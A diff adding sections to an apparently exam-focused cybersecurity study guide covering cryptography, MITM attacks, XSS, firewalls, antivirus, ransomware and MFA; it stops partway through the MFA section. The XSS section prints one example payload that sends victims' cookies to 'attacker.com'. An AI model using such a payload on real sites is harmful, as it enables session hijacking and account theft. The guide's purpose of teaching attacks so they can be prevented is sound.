@@ -1189,6 +1189,828 @@
             </div>
         </section>
 
+        <section class="content-section">
+            <h2 id="section-3-14">3.14 Cryptography</h2>
+
+            <div class="definition">
+                <strong>Definition:</strong>
+                <p><strong>Cryptography</strong> is the practice and study of techniques for securing communication and data from unauthorized access. It transforms readable data (plaintext) into an unreadable format (ciphertext) that can only be decoded by authorized parties.</p>
+            </div>
+
+            <h3>Key Concepts</h3>
+            <table class="academic-table">
+                <thead>
+                    <tr>
+                        <th>Term</th>
+                        <th>Definition</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Plaintext</strong></td>
+                        <td>The original readable data before encryption</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Ciphertext</strong></td>
+                        <td>The encrypted, unreadable form of data</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Encryption</strong></td>
+                        <td>The process of converting plaintext to ciphertext using an algorithm and key</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Decryption</strong></td>
+                        <td>The process of converting ciphertext back to plaintext using a key</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Key</strong></td>
+                        <td>A piece of information that controls the encryption/decryption process</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Algorithm/Cipher</strong></td>
+                        <td>The mathematical procedure used for encryption and decryption</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Types of Cryptography</h3>
+
+            <h4>1. Symmetric Key Cryptography</h4>
+            <div class="definition">
+                <p>Uses the <strong>same key</strong> for both encryption and decryption. Both sender and receiver must share the secret key securely.</p>
+            </div>
+            <table class="academic-table">
+                <thead>
+                    <tr>
+                        <th>Algorithm</th>
+                        <th>Key Size</th>
+                        <th>Description</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>AES (Advanced Encryption Standard)</strong></td>
+                        <td>128, 192, or 256 bits</td>
+                        <td>Current industry standard; used by governments and financial institutions</td>
+                    </tr>
+                    <tr>
+                        <td><strong>DES (Data Encryption Standard)</strong></td>
+                        <td>56 bits</td>
+                        <td>Legacy algorithm; now considered insecure due to small key size</td>
+                    </tr>
+                    <tr>
+                        <td><strong>3DES (Triple DES)</strong></td>
+                        <td>168 bits</td>
+                        <td>Applies DES three times; more secure than DES but slower</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Blowfish</strong></td>
+                        <td>32-448 bits</td>
+                        <td>Fast, flexible block cipher; open-source alternative</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h4>2. Asymmetric Key Cryptography (Public Key Cryptography)</h4>
+            <div class="definition">
+                <p>Uses a <strong>pair of keys</strong>: a public key (shared openly) for encryption and a private key (kept secret) for decryption.</p>
+            </div>
+            <table class="academic-table">
+                <thead>
+                    <tr>
+                        <th>Algorithm</th>
+                        <th>Description</th>
+                        <th>Use Cases</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>RSA (Rivest-Shamir-Adleman)</strong></td>
+                        <td>Based on factoring large prime numbers; key sizes 1024-4096 bits</td>
+                        <td>Digital signatures, secure key exchange, SSL/TLS</td>
+                    </tr>
+                    <tr>
+                        <td><strong>ECC (Elliptic Curve Cryptography)</strong></td>
+                        <td>Based on elliptic curve mathematics; smaller keys with equivalent security</td>
+                        <td>Mobile devices, IoT (due to efficiency)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Diffie-Hellman</strong></td>
+                        <td>Key exchange protocol for securely sharing keys over public channels</td>
+                        <td>Establishing shared secrets in protocols like TLS</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h4>3. Hash Functions</h4>
+            <div class="definition">
+                <strong>Hashing:</strong>
+                <p>A hash function is a <strong>one-way mathematical function</strong> that converts input data of any size into a fixed-size output (hash value or digest). It is NOT encryption because it cannot be reversed.</p>
+
+                <p><strong>Properties of Cryptographic Hash Functions:</strong></p>
+                <ul>
+                    <li><strong>Deterministic:</strong> Same input always produces the same output</li>
+                    <li><strong>One-Way:</strong> Cannot derive original input from hash value</li>
+                    <li><strong>Collision-Resistant:</strong> Extremely difficult to find two inputs with the same hash</li>
+                    <li><strong>Avalanche Effect:</strong> Small change in input produces completely different hash</li>
+                </ul>
+            </div>
+            <table class="academic-table">
+                <thead>
+                    <tr>
+                        <th>Algorithm</th>
+                        <th>Output Size</th>
+                        <th>Status</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>MD5</strong></td>
+                        <td>128 bits</td>
+                        <td>INSECURE - collision vulnerabilities found; not recommended</td>
+                    </tr>
+                    <tr>
+                        <td><strong>SHA-1</strong></td>
+                        <td>160 bits</td>
+                        <td>DEPRECATED - known weaknesses; being phased out</td>
+                    </tr>
+                    <tr>
+                        <td><strong>SHA-256</strong></td>
+                        <td>256 bits</td>
+                        <td>SECURE - current recommended standard</td>
+                    </tr>
+                    <tr>
+                        <td><strong>SHA-3</strong></td>
+                        <td>224-512 bits</td>
+                        <td>SECURE - newest standard with different design</td>
+                    </tr>
+                    <tr>
+                        <td><strong>bcrypt</strong></td>
+                        <td>Variable</td>
+                        <td>SECURE - specifically designed for password hashing; includes salt</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <p><strong>Use Cases for Hashing:</strong></p>
+            <ul>
+                <li><strong>Password Storage:</strong> Store hashes instead of plaintext passwords</li>
+                <li><strong>Data Integrity:</strong> Verify files haven't been modified (checksums)</li>
+                <li><strong>Digital Signatures:</strong> Hash of document is signed with private key</li>
+                <li><strong>Forensics:</strong> Verify evidence integrity in chain of custody</li>
+            </ul>
+
+            <h3>Encryption vs Decryption</h3>
+            <table class="academic-table">
+                <thead>
+                    <tr>
+                        <th>Encryption</th>
+                        <th>Decryption</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Converts plaintext to ciphertext</td>
+                        <td>Converts ciphertext back to plaintext</td>
+                    </tr>
+                    <tr>
+                        <td>Uses encryption key and algorithm</td>
+                        <td>Uses decryption key (same or different) and algorithm</td>
+                    </tr>
+                    <tr>
+                        <td>Makes data unreadable to unauthorized parties</td>
+                        <td>Restores data to readable form for authorized parties</td>
+                    </tr>
+                    <tr>
+                        <td>Sender performs encryption</td>
+                        <td>Receiver performs decryption</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Digital Signatures</h3>
+            <div class="definition">
+                <strong>Definition:</strong>
+                <p>A <strong>Digital Signature</strong> is a cryptographic mechanism that provides authenticity, integrity, and non-repudiation for digital documents and messages. It uses asymmetric cryptography.</p>
+
+                <p><strong>How Digital Signatures Work:</strong></p>
+                <ol>
+                    <li><strong>Signing:</strong> Sender creates hash of the document, then encrypts hash with their <strong>private key</strong></li>
+                    <li><strong>Verification:</strong> Receiver decrypts signature with sender's <strong>public key</strong> to get hash</li>
+                    <li><strong>Comparison:</strong> Receiver creates fresh hash of received document and compares with decrypted hash</li>
+                    <li>If hashes match, document is authentic and unmodified</li>
+                </ol>
+
+                <p><strong>Properties Provided:</strong></p>
+                <ul>
+                    <li><strong>Authentication:</strong> Proves the identity of the signer</li>
+                    <li><strong>Integrity:</strong> Detects any modification to the signed content</li>
+                    <li><strong>Non-Repudiation:</strong> Signer cannot deny having signed the document</li>
+                </ul>
+
+                <p><strong>Legal Validity:</strong> Digital signatures are legally valid under India's IT Act 2000 (Section 3) and Information Technology (Amendment) Act 2008.</p>
+            </div>
+
+            <h3>Applications of Cryptography</h3>
+            <ul>
+                <li><strong>HTTPS/TLS:</strong> Secure web browsing and online transactions</li>
+                <li><strong>Email Encryption:</strong> S/MIME, PGP for secure email</li>
+                <li><strong>VPNs:</strong> Encrypted tunnels for secure remote access</li>
+                <li><strong>Digital Certificates:</strong> PKI for website authentication</li>
+                <li><strong>Cryptocurrency:</strong> Blockchain uses hash functions and digital signatures</li>
+                <li><strong>Disk Encryption:</strong> BitLocker, FileVault, VeraCrypt</li>
+            </ul>
+
+            <div class="key-points">
+                <h4>Key Points for Examination:</h4>
+                <ul>
+                    <li>Symmetric encryption uses same key for encryption and decryption (AES, DES)</li>
+                    <li>Asymmetric encryption uses public-private key pairs (RSA, ECC)</li>
+                    <li>Hashing is one-way; cannot be reversed (SHA-256, MD5)</li>
+                    <li>Digital signatures provide authenticity, integrity, and non-repudiation</li>
+                    <li>AES is the current industry standard for symmetric encryption</li>
+                    <li>SHA-256 is the recommended hash algorithm; MD5 and SHA-1 are insecure</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="content-section">
+            <h2 id="section-3-15">3.15 Man-in-the-Middle (MITM) Attack</h2>
+
+            <div class="definition">
+                <strong>Definition:</strong>
+                <p>A <strong>Man-in-the-Middle (MITM) Attack</strong> is a cyberattack where an attacker secretly intercepts and potentially alters communications between two parties who believe they are communicating directly with each other.</p>
+            </div>
+
+            <h3>How MITM Attacks Work</h3>
+            <ol>
+                <li><strong>Interception:</strong> Attacker positions themselves between victim and target (server, website, etc.)</li>
+                <li><strong>Eavesdropping:</strong> Attacker captures all communications passing through</li>
+                <li><strong>Modification (Optional):</strong> Attacker can alter messages before forwarding</li>
+                <li><strong>Relay:</strong> Both parties believe they're communicating directly</li>
+            </ol>
+
+            <h3>Types of MITM Attacks</h3>
+            <table class="academic-table">
+                <thead>
+                    <tr>
+                        <th>Attack Type</th>
+                        <th>Description</th>
+                        <th>Target</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>ARP Spoofing (ARP Poisoning)</strong></td>
+                        <td>Attacker sends fake ARP messages on local network, associating their MAC address with legitimate IP addresses</td>
+                        <td>Local Area Networks</td>
+                    </tr>
+                    <tr>
+                        <td><strong>DNS Spoofing (DNS Cache Poisoning)</strong></td>
+                        <td>Attacker corrupts DNS cache to redirect users to malicious websites</td>
+                        <td>DNS servers, client caches</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Session Hijacking</strong></td>
+                        <td>Attacker steals session cookies to impersonate authenticated user</td>
+                        <td>Web sessions, authentication</td>
+                    </tr>
+                    <tr>
+                        <td><strong>SSL Stripping</strong></td>
+                        <td>Attacker downgrades HTTPS connections to HTTP, intercepting unencrypted traffic</td>
+                        <td>HTTPS websites</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Evil Twin Attack</strong></td>
+                        <td>Attacker creates fake Wi-Fi access point mimicking legitimate network</td>
+                        <td>Wi-Fi users</td>
+                    </tr>
+                    <tr>
+                        <td><strong>HTTPS Spoofing</strong></td>
+                        <td>Attacker creates fake SSL certificate to impersonate legitimate website</td>
+                        <td>HTTPS connections</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Email Hijacking</strong></td>
+                        <td>Attacker gains access to email accounts and intercepts/modifies communications</td>
+                        <td>Business email compromise</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Impact of MITM Attacks</h3>
+            <ul>
+                <li>Theft of login credentials and personal information</li>
+                <li>Financial fraud through intercepted banking sessions</li>
+                <li>Corporate espionage and data theft</li>
+                <li>Injection of malware into downloads</li>
+                <li>Modification of business communications</li>
+            </ul>
+
+            <h3>Prevention Measures</h3>
+            <ul>
+                <li><strong>Use HTTPS:</strong> Always verify the padlock icon and certificate validity</li>
+                <li><strong>HSTS (HTTP Strict Transport Security):</strong> Forces HTTPS connections</li>
+                <li><strong>Certificate Pinning:</strong> Applications verify server certificates against known values</li>
+                <li><strong>VPN:</strong> Encrypts all traffic, preventing eavesdropping</li>
+                <li><strong>Strong Wi-Fi Security:</strong> Use WPA3, avoid public Wi-Fi for sensitive activities</li>
+                <li><strong>Two-Factor Authentication:</strong> Limits impact of stolen credentials</li>
+                <li><strong>Email Security:</strong> Use encrypted email (S/MIME, PGP)</li>
+                <li><strong>Network Security:</strong> Implement ARP spoofing detection, use static ARP entries</li>
+            </ul>
+
+            <div class="key-points">
+                <h4>Key Points for Examination:</h4>
+                <ul>
+                    <li>MITM attacks intercept communication between two parties</li>
+                    <li>Common types: ARP spoofing, DNS spoofing, SSL stripping, Evil Twin</li>
+                    <li>HTTPS with valid certificates prevents most MITM attacks</li>
+                    <li>Public Wi-Fi is highly vulnerable to Evil Twin attacks</li>
+                    <li>VPNs provide strong protection by encrypting all traffic</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="content-section">
+            <h2 id="section-3-16">3.16 Cross-Site Scripting (XSS)</h2>
+
+            <div class="definition">
+                <strong>Definition:</strong>
+                <p><strong>Cross-Site Scripting (XSS)</strong> is a web security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. The injected scripts execute in victims' browsers with the same privileges as legitimate page content.</p>
+            </div>
+
+            <h3>Types of XSS Attacks</h3>
+            <table class="academic-table">
+                <thead>
+                    <tr>
+                        <th>Type</th>
+                        <th>Description</th>
+                        <th>Persistence</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Stored XSS (Persistent)</strong></td>
+                        <td>Malicious script is permanently stored on target server (database, message board, comment field). All users who view the content are affected.</td>
+                        <td>Permanent - affects multiple users</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Reflected XSS (Non-Persistent)</strong></td>
+                        <td>Malicious script is embedded in a URL or form input and reflected back by the server in the response. Requires victim to click crafted link.</td>
+                        <td>Temporary - requires user action</td>
+                    </tr>
+                    <tr>
+                        <td><strong>DOM-Based XSS</strong></td>
+                        <td>Vulnerability exists in client-side JavaScript code that processes user input. Script executes entirely in browser without server involvement.</td>
+                        <td>Client-side only</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Impact of XSS Attacks</h3>
+            <ul>
+                <li><strong>Cookie Theft:</strong> Steal session cookies to hijack user accounts</li>
+                <li><strong>Credential Theft:</strong> Display fake login forms to capture passwords</li>
+                <li><strong>Malware Distribution:</strong> Redirect users to malicious downloads</li>
+                <li><strong>Website Defacement:</strong> Alter page content seen by users</li>
+                <li><strong>Keylogging:</strong> Capture keystrokes on the page</li>
+                <li><strong>Phishing:</strong> Display convincing phishing content within legitimate site</li>
+            </ul>
+
+            <h3>XSS Attack Example</h3>
+            <p>A simple XSS payload in a comment field:</p>
+            <pre>&lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;</pre>
+            <p>When other users view the comment, their cookies are sent to the attacker.</p>
+
+            <h3>Prevention Measures</h3>
+            <ul>
+                <li><strong>Input Validation:</strong> Validate and sanitize all user inputs on both client and server side</li>
+                <li><strong>Output Encoding:</strong> Encode special characters (&lt;, &gt;, &amp;, ', ") before displaying in HTML</li>
+                <li><strong>Content Security Policy (CSP):</strong> HTTP header that restricts script sources</li>
+                <li><strong>HttpOnly Cookies:</strong> Prevent JavaScript access to session cookies</li>
+                <li><strong>X-XSS-Protection Header:</strong> Enable browser's built-in XSS filter</li>
+                <li><strong>Use Security Libraries:</strong> OWASP ESAPI, DOMPurify for input sanitization</li>
+                <li><strong>Avoid innerHTML:</strong> Use textContent or secure DOM manipulation methods</li>
+            </ul>
+
+            <div class="key-points">
+                <h4>Key Points for Examination:</h4>
+                <ul>
+                    <li>XSS allows injection of malicious scripts into web pages</li>
+                    <li>Three types: Stored (persistent), Reflected (non-persistent), DOM-based</li>
+                    <li>Mainly used to steal session cookies and credentials</li>
+                    <li>Prevention: Input validation, output encoding, CSP, HttpOnly cookies</li>
+                    <li>XSS is an OWASP Top 10 vulnerability</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="content-section">
+            <h2 id="section-3-17">3.17 Firewall</h2>
+
+            <div class="definition">
+                <strong>Definition:</strong>
+                <p>A <strong>Firewall</strong> is a network security system that monitors and controls incoming and outgoing network traffic based on predetermined security rules. It establishes a barrier between a trusted internal network and untrusted external networks (like the Internet).</p>
+
+                <p><strong>Functions of a Firewall:</strong></p>
+                <ul>
+                    <li><strong>Packet Filtering:</strong> Examines packets and allows/blocks based on rules</li>
+                    <li><strong>Access Control:</strong> Blocks unauthorized access to network resources</li>
+                    <li><strong>Traffic Monitoring:</strong> Logs network activity for analysis</li>
+                    <li><strong>NAT (Network Address Translation):</strong> Hides internal IP addresses from external network</li>
+                    <li><strong>VPN Support:</strong> May facilitate secure remote connections</li>
+                </ul>
+            </div>
+
+            <h3>Types of Firewalls</h3>
+            <table class="academic-table">
+                <thead>
+                    <tr>
+                        <th>Type</th>
+                        <th>OSI Layer</th>
+                        <th>Description</th>
+                        <th>Limitations</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Packet Filtering Firewall</strong></td>
+                        <td>Layer 3-4</td>
+                        <td>Examines packet headers (IP addresses, ports, protocols) and applies rules</td>
+                        <td>Cannot inspect packet content; vulnerable to IP spoofing</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Stateful Inspection Firewall</strong></td>
+                        <td>Layer 3-4</td>
+                        <td>Tracks state of active connections and makes decisions based on context</td>
+                        <td>Resource-intensive; still limited application-layer visibility</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Application Layer Firewall (Proxy)</strong></td>
+                        <td>Layer 7</td>
+                        <td>Acts as intermediary; inspects application-layer content (HTTP, FTP, etc.)</td>
+                        <td>Slower performance; may not support all protocols</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Next-Generation Firewall (NGFW)</strong></td>
+                        <td>Layer 3-7</td>
+                        <td>Combines traditional firewall with IPS, deep packet inspection, application awareness, SSL inspection</td>
+                        <td>Complex to configure; expensive</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Hardware Firewall</strong></td>
+                        <td>Variable</td>
+                        <td>Dedicated physical device protecting entire network</td>
+                        <td>Cost; requires physical installation</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Software Firewall</strong></td>
+                        <td>Variable</td>
+                        <td>Application installed on individual devices</td>
+                        <td>Consumes system resources; per-device management</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Firewall Rule Components</h3>
+            <ul>
+                <li><strong>Source IP Address:</strong> Where the traffic originates</li>
+                <li><strong>Destination IP Address:</strong> Where the traffic is going</li>
+                <li><strong>Port Number:</strong> Service port (e.g., 80 for HTTP, 443 for HTTPS)</li>
+                <li><strong>Protocol:</strong> TCP, UDP, ICMP, etc.</li>
+                <li><strong>Action:</strong> ALLOW, DENY, DROP, or LOG</li>
+                <li><strong>Direction:</strong> Inbound or Outbound</li>
+            </ul>
+
+            <h3>Examples of Firewall Products</h3>
+            <ul>
+                <li><strong>Enterprise:</strong> Cisco ASA, Palo Alto Networks, Fortinet FortiGate, Check Point</li>
+                <li><strong>Software:</strong> Windows Defender Firewall, iptables (Linux), pfSense</li>
+                <li><strong>Cloud:</strong> AWS Security Groups, Azure Firewall, GCP Cloud Firewall</li>
+            </ul>
+
+            <div class="key-points">
+                <h4>Key Points for Examination:</h4>
+                <ul>
+                    <li>Firewall monitors and controls network traffic based on security rules</li>
+                    <li>Types: Packet filtering, Stateful inspection, Application-layer (Proxy), NGFW</li>
+                    <li>NGFW combines traditional firewall with IPS, application awareness, and deep packet inspection</li>
+                    <li>Rules based on: Source/Destination IP, Port, Protocol, Action</li>
+                    <li>Hardware firewalls protect entire networks; Software firewalls protect individual devices</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="content-section">
+            <h2 id="section-3-18">3.18 Antivirus Software</h2>
+
+            <div class="definition">
+                <strong>Definition:</strong>
+                <p><strong>Antivirus software</strong> is a program designed to detect, prevent, and remove malicious software (malware) including viruses, worms, Trojans, spyware, ransomware, and other threats from computer systems.</p>
+            </div>
+
+            <h3>How Antivirus Software Works</h3>
+
+            <h4>Detection Methods</h4>
+            <table class="academic-table">
+                <thead>
+                    <tr>
+                        <th>Method</th>
+                        <th>Description</th>
+                        <th>Pros/Cons</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Signature-Based Detection</strong></td>
+                        <td>Compares file signatures against database of known malware signatures</td>
+                        <td>Accurate for known threats; cannot detect new (zero-day) malware</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Heuristic-Based Detection</strong></td>
+                        <td>Analyzes code structure and behavior patterns to identify potentially malicious code</td>
+                        <td>Can detect unknown variants; may produce false positives</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Behavioral Detection (Sandbox)</strong></td>
+                        <td>Runs suspicious files in isolated environment to observe actual behavior</td>
+                        <td>Effective against evasive malware; slower performance</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Cloud-Based Detection</strong></td>
+                        <td>Sends suspicious file hash to cloud for analysis against latest threat data</td>
+                        <td>Access to real-time threat intelligence; requires internet connection</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Machine Learning/AI Detection</strong></td>
+                        <td>Uses ML models trained on malware samples to identify new threats</td>
+                        <td>Can detect novel malware; requires significant training data</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h4>Antivirus Operations</h4>
+            <ul>
+                <li><strong>Real-Time (On-Access) Scanning:</strong> Monitors files as they are opened, downloaded, or executed</li>
+                <li><strong>On-Demand Scanning:</strong> User-initiated full or partial system scan</li>
+                <li><strong>Scheduled Scanning:</strong> Automatic scans at configured intervals</li>
+                <li><strong>Email Scanning:</strong> Scans email attachments for threats</li>
+                <li><strong>Download Scanning:</strong> Scans files as they are downloaded from internet</li>
+            </ul>
+
+            <h4>Response Actions</h4>
+            <ul>
+                <li><strong>Quarantine:</strong> Isolates infected file to prevent execution while preserving it for analysis</li>
+                <li><strong>Delete:</strong> Permanently removes the malicious file</li>
+                <li><strong>Disinfect/Clean:</strong> Attempts to remove malicious code while preserving original file</li>
+                <li><strong>Block:</strong> Prevents execution or access to suspicious file</li>
+                <li><strong>Alert:</strong> Notifies user of potential threat for manual decision</li>
+            </ul>
+
+            <h3>Limitations of Antivirus</h3>
+            <ul>
+                <li>Cannot detect zero-day malware if using only signature-based detection</li>
+                <li>May impact system performance during scans</li>
+                <li>Requires regular updates to remain effective</li>
+                <li>Cannot protect against all social engineering attacks</li>
+                <li>May produce false positives (flagging legitimate software)</li>
+                <li>Advanced malware may disable or evade antivirus</li>
+            </ul>
+
+            <h3>Antivirus Software Examples</h3>
+            <ul>
+                <li><strong>Free:</strong> Windows Defender, Avast Free, AVG Free, Bitdefender Free</li>
+                <li><strong>Paid:</strong> Norton, Kaspersky, Bitdefender, McAfee, ESET</li>
+                <li><strong>Enterprise:</strong> CrowdStrike, Symantec Endpoint Protection, Sophos</li>
+            </ul>
+
+            <div class="key-points">
+                <h4>Key Points for Examination:</h4>
+                <ul>
+                    <li>Antivirus detects, prevents, and removes malware from systems</li>
+                    <li>Detection methods: Signature-based, Heuristic, Behavioral, Cloud-based, AI/ML</li>
+                    <li>Signature-based detection cannot detect zero-day (new) malware</li>
+                    <li>Operations: Real-time scanning, on-demand scanning, email scanning</li>
+                    <li>Response actions: Quarantine, Delete, Disinfect, Block</li>
+                    <li>Regular signature updates are essential for effectiveness</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="content-section">
+            <h2 id="section-3-19">3.19 Ransomware</h2>
+
+            <div class="definition">
+                <strong>Definition:</strong>
+                <p><strong>Ransomware</strong> is a type of malicious software that encrypts the victim's files or locks them out of their system, demanding a ransom payment (usually in cryptocurrency) to restore access.</p>
+            </div>
+
+            <h3>Types of Ransomware</h3>
+            <table class="academic-table">
+                <thead>
+                    <tr>
+                        <th>Type</th>
+                        <th>Description</th>
+                        <th>Impact</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Crypto Ransomware (Encrypting)</strong></td>
+                        <td>Encrypts files using strong encryption algorithms</td>
+                        <td>Files inaccessible without decryption key</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Locker Ransomware</strong></td>
+                        <td>Locks user out of operating system/device</td>
+                        <td>Cannot access system but files may not be encrypted</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Scareware</strong></td>
+                        <td>Displays fake warnings claiming system is infected</td>
+                        <td>Demands payment for fake "cleaning" software</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Doxware (Leakware)</strong></td>
+                        <td>Threatens to publish stolen data if ransom not paid</td>
+                        <td>Combines encryption with data theft and extortion</td>
+                    </tr>
+                    <tr>
+                        <td><strong>RaaS (Ransomware-as-a-Service)</strong></td>
+                        <td>Criminal model where developers sell/rent ransomware to affiliates</td>
+                        <td>Enables non-technical criminals to launch attacks</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Ransomware Distribution Methods</h3>
+            <ul>
+                <li><strong>Phishing Emails:</strong> Malicious attachments or links in emails</li>
+                <li><strong>Malicious Downloads:</strong> Infected software or drive-by downloads</li>
+                <li><strong>RDP Exploitation:</strong> Compromising exposed Remote Desktop Protocol</li>
+                <li><strong>Exploitation Kits:</strong> Automated tools exploiting software vulnerabilities</li>
+                <li><strong>Malvertising:</strong> Malicious advertisements on legitimate websites</li>
+                <li><strong>USB Drives:</strong> Infected removable media</li>
+            </ul>
+
+            <h3>Notable Ransomware Attacks</h3>
+            <ul>
+                <li><strong>WannaCry (2017):</strong> Affected 200,000+ computers in 150 countries; exploited Windows SMB vulnerability</li>
+                <li><strong>NotPetya (2017):</strong> Disguised as ransomware but designed for destruction; $10 billion in damages</li>
+                <li><strong>REvil/Sodinokibi:</strong> Major RaaS operation; $70 million demand from Kaseya attack</li>
+                <li><strong>Conti:</strong> Targeted hospitals, schools, government; leaked internal operations</li>
+                <li><strong>LockBit:</strong> Currently active RaaS with fast encryption</li>
+            </ul>
+
+            <h3>Prevention Measures</h3>
+            <ul>
+                <li><strong>Regular Backups:</strong> Maintain offline, tested backups (3-2-1 rule: 3 copies, 2 media types, 1 offsite)</li>
+                <li><strong>Email Security:</strong> Filter malicious attachments and links</li>
+                <li><strong>Patch Management:</strong> Keep systems and software updated</li>
+                <li><strong>User Training:</strong> Educate users on phishing and safe practices</li>
+                <li><strong>Network Segmentation:</strong> Limit lateral movement if infected</li>
+                <li><strong>Endpoint Protection:</strong> Use modern EDR with ransomware detection</li>
+                <li><strong>Disable RDP:</strong> Or use VPN and strong authentication for remote access</li>
+                <li><strong>Application Whitelisting:</strong> Allow only approved software to run</li>
+            </ul>
+
+            <h3>Response to Ransomware Attack</h3>
+            <ol>
+                <li><strong>Isolate:</strong> Disconnect infected systems from network immediately</li>
+                <li><strong>Identify:</strong> Determine ransomware variant (may help find decryptors)</li>
+                <li><strong>Report:</strong> Notify law enforcement and relevant authorities</li>
+                <li><strong>Do NOT Pay:</strong> Payment doesn't guarantee recovery and funds criminal activity</li>
+                <li><strong>Restore:</strong> Recover from clean backups after cleaning system</li>
+                <li><strong>Investigate:</strong> Determine root cause to prevent recurrence</li>
+            </ol>
+
+            <div class="key-points">
+                <h4>Key Points for Examination:</h4>
+                <ul>
+                    <li>Ransomware encrypts files and demands payment for decryption</li>
+                    <li>Types: Crypto ransomware, Locker ransomware, Doxware, RaaS</li>
+                    <li>Spread through: Phishing, malicious downloads, RDP exploitation</li>
+                    <li>Notable examples: WannaCry, NotPetya, REvil, LockBit</li>
+                    <li>Prevention: Backups, patching, user training, endpoint protection</li>
+                    <li>Never pay ransom - it doesn't guarantee recovery</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="content-section">
+            <h2 id="section-3-20">3.20 Multi-Factor Authentication (MFA)</h2>
+
+            <div class="definition">
+                <strong>Definition:</strong>
+                <p><strong>Multi-Factor Authentication (MFA)</strong> is a security mechanism that requires users to provide two or more verification factors to gain access to an account, application, or system. It adds layers of security beyond just a password.</p>
+            </div>
+
+            <h3>The Three Authentication Factors</h3>
+            <table class="academic-table">
+                <thead>
+                    <tr>
+                        <th>Factor</th>
+                        <th>Description</th>
+                        <th>Examples</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Something You Know</strong></td>
+                        <td>Knowledge-based credentials that only the user should know</td>
+                        <td>Password, PIN, security questions</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Something You Have</strong></td>
+                        <td>Physical items in the user's possession</td>
+                        <td>Mobile phone (OTP), hardware token (YubiKey), smart card</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Something You Are</strong></td>
+                        <td>Biometric characteristics unique to the user</td>
+                        <td>Fingerprint, face recognition, iris scan, voice</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Additional Factors (Context-Based)</h3>
+            <ul>
+                <li><strong>Somewhere You Are (Location):</strong> GPS location, IP address geolocation</li>
+                <li><strong>Something You Do (Behavior):</strong> Typing patterns, device usage patterns</li>
+            </ul>
+
+            <h3>Common MFA Methods</h3>
+            <table class="academic-table">
+                <thead>
+                    <tr>
+                        <th>Method</th>
+                        <th>How It Works</th>
+                        <th>Security Level</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>SMS OTP</strong></td>
+                        <td>One-time code sent via text message</td>
+                        <td>Low - vulnerable to SIM swapping and interception</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Email OTP</strong></td>
+                        <td>One-time code sent to email</td>
+                        <td>Low - depends on email account security</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Authenticator Apps</strong></td>
+                        <td>Time-based OTP (TOTP) generated by apps like Google Authenticator, Microsoft Authenticator, Authy</td>
+                        <td>High - codes generated locally, no network transmission</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Push Notifications</strong></td>
+                        <td>App sends approval request to registered device</td>
+                        <td>High - easy to use, but beware of push fatigue attacks</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Hardware Security Keys</strong></td>
+                        <td>Physical devices using FIDO2/WebAuthn standards (YubiKey, Titan)</td>
+                        <td>Very High - phishing-resistant, cryptographic authentication</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Biometric</strong></td>
+                        <td>Fingerprint, face, or iris recognition</td>
+                        <td>High - unique to individual; cannot be shared</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Benefits of MFA</h3>
